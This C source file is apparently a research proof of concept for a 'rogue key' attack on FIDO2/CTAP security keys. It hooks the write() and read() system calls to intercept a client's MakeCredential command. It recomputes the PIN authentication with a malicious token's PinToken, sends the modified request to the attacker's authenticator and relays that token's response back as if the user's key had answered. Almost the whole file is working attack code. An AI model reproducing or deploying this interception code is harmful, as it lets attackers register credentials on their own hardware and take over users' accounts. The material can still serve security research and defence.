#include "rogue_key_attack.h"

int global_file_descriptor;
int (*real_write)(int fd, const void *buf, size_t count);
int (*real_read)(int fd, void *buf, size_t count);

ssize_t write(int fd, const void *buf, size_t count)
{
    real_write = dlsym(RTLD_NEXT, "write");

    if (hook_this_write(fd, count)) {

        // If file .swap does not exist, the attack is not executed, just write as normal.
        if (!file_exists(master_file_filename)) {
            printf("File [%s] does not exist, so no attack performed!\n", master_file_filename);
            remove(swap_helper_filename);
            return real_write(fd, buf, count);
        }

        frame_t *fp;
        
        unsigned char pkt_local[sizeof(*fp) + 1];

        memcpy(pkt_local, buf, sizeof(*fp) + 1);

        fp = (struct frame *)(pkt_local + 1);

        state_helper_t* helper;

        // If the file does not exist, then this is the first command, whatever that might be, therefore it has a body.init.data
        if (!file_exists(swap_helper_filename)) {

            // The first byte of body.init.data is the CTAP command.
            uint8_t cmd = fp->body.init.data[0];

            attack_log("Command [%d] detected!\n\n", cmd);

            // We only want to make the attack when the client (browser or app like libfido2) sends certain commands
            switch(cmd) {

                // We only start the attack for the MakeCred command, which we want to manipulate
                case CTAP_CBOR_MAKECRED:

                    attack_log("Make credential command detected!\n");

                    helper = malloc(sizeof(state_helper_t));

                    // Save information in helper
                    helper->fd = fd;
                    helper->command = fp->body.init.cmd;
                    helper->ctap_command = cmd;
                    helper->cid = fp->cid;
                    helper->payload_len = (size_t)((fp->body.init.bcnth << 8) | fp->body.init.bcntl);
                    helper->writen_so_far = 0;
                    helper->frame_count = 0;
                    helper->delete_on_next_write = 0;
                    helper->swap_token = 0;

                    for (int i = 0; i < sizeof(fp->body.init.data); i++) {
                        helper->cbor_payload[i] = fp->body.init.data[i];
                        helper->writen_so_far++;
                    }
                    helper->frames[helper->frame_count++] = *fp;

                    helper->expected_frames = 1;

                    if (sizeof(fp->body.init.data) < helper->payload_len) {
                        helper->expected_frames += ceil((float)(helper->payload_len - sizeof(fp->body.init.data)) / (CTAP_MAX_REPORT_LEN - CTAP_CONT_HEADER_LEN));
                    }

                    attack_log("Expecting %d packets to be sent by the client! (total CBOR length is %ld)\n", helper->expected_frames, helper->payload_len);

                    FILE *swap_helper_file = fopen(swap_helper_filename, "w");
                    fwrite(helper, sizeof(*helper), 1, swap_helper_file);      
                    fclose(swap_helper_file);  

                    return real_write(fd, buf, count);

                default:
                    break;

            }

            return real_write(fd, buf, count);
        }


        // This is not the first write for this command, so we continue writing...
        else {
            
            helper = malloc(sizeof(state_helper_t));

            FILE *swap_helper_file = fopen(swap_helper_filename, "r+");
            if (swap_helper_filename == NULL) {
                printf("Something is wrong, the file [%s] should exist but does not! Ignoring attack...", swap_helper_filename);
                return real_write(fd, buf, count);
            }
            fread(helper, sizeof(state_helper_t), 1, swap_helper_file);

            if (helper->fd != fd) {
                return -1;
            }

            rewind(swap_helper_file);

            // This is not the last packet to be written
            if (helper->payload_len - helper->writen_so_far >= sizeof(fp->body.cont.data)) {


                int writen_so_far_aux = helper->writen_so_far;
                for (int i = 0; i < sizeof(fp->body.cont.data); i++) {
                    (helper->cbor_payload + writen_so_far_aux)[i] = fp->body.cont.data[i];
                    helper->writen_so_far++;
                }
                helper->frames[helper->frame_count++] = *fp;

                attack_log("Continuing packet writing for command [%d] (%d out of %d)\n", helper->ctap_command, helper->frame_count, helper->expected_frames);

                fwrite(helper, sizeof(*helper), 1, swap_helper_file);      
                fclose(swap_helper_file);

                return real_write(fd, buf, count);

            }

            // This is the last packet to be written, and where the action takes place
            else {

                int writen_so_far_aux = helper->writen_so_far;
                for (int i = 0; i < helper->payload_len - writen_so_far_aux; i++) {
                    (helper->cbor_payload + writen_so_far_aux)[i] = fp->body.cont.data[i];
                    helper->writen_so_far++;
                }
                helper->frames[helper->frame_count++] = *fp;

                attack_log("Writing final packet for command [%d] (%d out of %d)\n", helper->ctap_command, helper->frame_count, helper->expected_frames);

                /* 
                From this point on we have every frame saved in the helper structure, and the real token is missing the last one,
                which means the client is still waiting for the last write's response.
                */

                struct cbor_load_result result;

                cbor_item_t *item = cbor_load(helper->cbor_payload + 1, helper->payload_len - 1, &result);

#ifdef ATTACK_LOG
                attack_log("Original payload\n");
                cbor_describe(item, stdout);
                fflush(stdout);
                for (int i = 0; i < helper->payload_len; i++) {
                    attack_log("%02X", helper->cbor_payload[i]);
                }
                attack_log("\n");
#endif

                size_t map_size = cbor_map_size(item);

                struct cbor_pair *pairs = cbor_map_handle(item);

                switch(helper->ctap_command) {
                    /*
                        This case handles:
                            - open bad token (malicious token from the attacker)
                            - get bad token PinToken
                            - replacing the auth tag in the CBOR (cbor index 8 in the map, but index 4 in the structure) 
                            with the auth tag created using the bad token PinToken
                            - replacing the index 9?
                            - writing the whole modified CBOR to the token
                    */
                    case CTAP_CBOR_MAKECRED:

                        // This check is meant to catch the libfido2-specific case where the PIN was not selected/needed
                        if (map_size < 6) {
                            printf("The payload received does not have PinToken authentication because it did not involve using a PIN!\n");
                            fclose(swap_helper_file);
                            remove(swap_helper_filename);
                            return real_write(fd, buf, count);
                        }

                        // We first open the bad token that should be plugged in at this moment
                        // This is a very dumb way to keep the attack waiting for the malicious token to be inserted.
                        // In a real scenario, we would access the token remotely in the attacker's machine, so no harm here.
                        helper->bad_token_dev = open_bad_token();
                        while (helper->bad_token_dev == NULL) {
                            helper->bad_token_dev = open_bad_token();
                        }
                        helper->bad_token_fd = get_dev_file_descriptor(helper->bad_token_dev);
                        attack_log("Malicious token is open with file descriptor [%d]\n", helper->bad_token_fd);

                        // The .swap file must contain the PIN for the malicious token, otherwise it defaults to "1111" 
                        FILE* swap_file = fopen(swap_filename, "r");
                        if (swap_file == NULL) {
                            memcpy(helper->bad_token_pin, "1111", 5);
                        }
                        else {
                            char c;
                            int i = 0;
                            while((c = fgetc(swap_file)) != '\n') {
                                helper->bad_token_pin[i] = c;
                                i++;
                                attack_log("PIN character: %c\n", c);
                            }
                            helper->bad_token_pin[i] = '\0';
                            fclose(swap_file);
                        }
                        
                        attack_log("\nBad token PIN is: %s\n", helper->bad_token_pin);

                        int result = get_pin_token(helper);

                        attack_log("Got malicious authenticator's PinToken: %s (result == %d)\n", (result == 0) ? "OK" : "FAILED", result);

                        if (result < 0) {
                            errx(1, "Failed to get the Pin Token from bad token. Aborting...");
                        }

                        fido_blob_t *challenge = fido_blob_new();

                        result = fido_blob_decode(pairs[0].value, challenge);

                        if (result < 0) {
                            errx(1, "Could not get challenge from CBOR structure. Aborting...");
                        }

                        attack_log("Bad token pin token: ");
                        printUnsignedChar(helper->bad_token_pin_token->ptr, helper->bad_token_pin_token->len, NULL);
                        attack_log("\n");


                        /* 
                           Replace HMAC calculated with pintoken on the challenge.
                           The heuristic here is that the HMAC to authenticate the command will be in the second to last position
                           and the PIN operation (1 or 2) will be in the last.
                           If not, some additional logic is needed to adapt the CBOR strucuture to an authenticator that expects a different order.
                        */      
                        pairs[map_size - 2].value = cbor_encode_pin_auth(fido_dev_get_pin_protocol(helper->bad_token_dev), helper->bad_token_pin_token, challenge);
                        pairs[map_size - 1].value = cbor_encode_pin_opt(helper->bad_token_dev);

                        unsigned char	*cbor = NULL;
                        size_t		 cbor_len;
                        size_t		 cbor_alloc_len;

                        cbor_len = cbor_serialize_alloc(item, &cbor, &cbor_alloc_len); 

                        // zero the previous cbor payload except for the first byte representing the command
                        memset(helper->cbor_payload + 1, 0, sizeof(helper->cbor_payload) - 1);
                        // copy new cbor payload to helper->cbor_payload and set the new payload length
                        memcpy(helper->cbor_payload + 1, cbor, cbor_len);
                        helper->payload_len = cbor_len + 1;     
                        
                        // We are now ready to send the frames
                        int ms = helper->bad_token_dev->timeout_ms;
                        //temporarily change file descriptor in helper
                        helper->fd = helper->bad_token_fd;
                        uint32_t save_cid = helper->cid;
                        helper->cid = helper->bad_token_dev->cid;
                        int frames_sent = send_frames(helper, helper->command, helper->cbor_payload, helper->payload_len, &ms, real_write);
                        helper->fd = fd;
                        helper->cid = save_cid;
                        attack_log("\nFrames sent: %d\n", frames_sent);
                        
                        helper->swap_token = 1;
                        helper->client_read_so_far = 0;

                        fwrite(helper, sizeof(*helper), 1 ,swap_helper_file);

                        break;
                                          
                    default:
                        break;
                }

                fclose(swap_helper_file);

                return real_write(fd, buf, count);

            }

        }
                
    }

    return real_write(fd, buf, count);

} 


ssize_t read(int fd, void *buf, size_t count)
{
    real_read = dlsym(RTLD_NEXT, "read");

    ssize_t reply_len;

    if (hook_this_read_v3(fd, count)) {

        if (!file_exists(swap_helper_filename)) {
            return real_read(fd, buf, count);
        }

        FILE* swap_helper_file = fopen(swap_helper_filename, "r+");
        if (swap_helper_file == NULL) {
            return real_read(fd, buf, count);
        }

        state_helper_t *helper = malloc(sizeof(state_helper_t));

        fread(helper, sizeof(*helper), 1, swap_helper_file);
        rewind(swap_helper_file);

        int result = -1;

        if (fd != helper->fd) {
            return real_read(fd, buf, count);
        }

        attack_log("Will read from %s!\n", helper->swap_token ? "malicious token" : "user token");
        if (helper->swap_token) {
            result = real_read(helper->bad_token_fd, buf, count);

            frame_t *fp = (frame_t*)buf;
            fp->cid = helper->cid;

#ifdef ATTACK_LOG   
            if (fp->body.init.data[0] == FIDO_OK || helper->client_read_so_far > 0) {
                // First packet
                if (helper->client_read_so_far == 0) {
                    attack_log("Token responded with code: 0x%02x\n", fp->body.init.data[0]);
                    helper->payload_len = (size_t)((fp->body.init.bcnth << 8) | fp->body.init.bcntl);
                    int amount_to_read = MIN(sizeof(fp->body.init.data), helper->payload_len);
                    memcpy(helper->cbor_payload, fp->body.init.data, amount_to_read);
                    helper->client_read_so_far += amount_to_read;
                }
                else {
                    int amount_to_read = MIN(sizeof(fp->body.cont.data), helper->payload_len - helper->client_read_so_far);
                    memcpy(helper->cbor_payload + helper->client_read_so_far, fp->body.init.data, amount_to_read);
                    helper->client_read_so_far += amount_to_read;

 
                    // read is complete, every frame is in cbor_payload
                    if (helper->client_read_so_far >= helper->payload_len) {
                        struct cbor_load_result discard;
                        cbor_item_t *cbor_map = cbor_load(helper->cbor_payload + 1, helper->payload_len - 1, &discard);

                 
                        attack_log("Response in CBOR_MAP from malicious token:\n");
                        cbor_describe(cbor_map, stdout);
                        fflush(stdout);

                        attack_log("Printing CBOR PAYLOAD IN HEX!\n");
                        for (int i = 0; i < helper->payload_len; i++) {
                            attack_log("%02X", helper->cbor_payload[i]);
                        }
                        attack_log("\n");
                    }

                }

                
            }
#endif

            // If this line executes, the next write that targets a FIDO device will not perform any attack.
            // Hence, the client will perform normally.
            remove(master_file_filename);
        }
        else {
            result = real_read(fd, buf, count);
        }

        fwrite(helper, sizeof(*helper), 1, swap_helper_file);
        fclose(swap_helper_file);

        return result;
        
    }
   
    return real_read(fd, buf, count);
}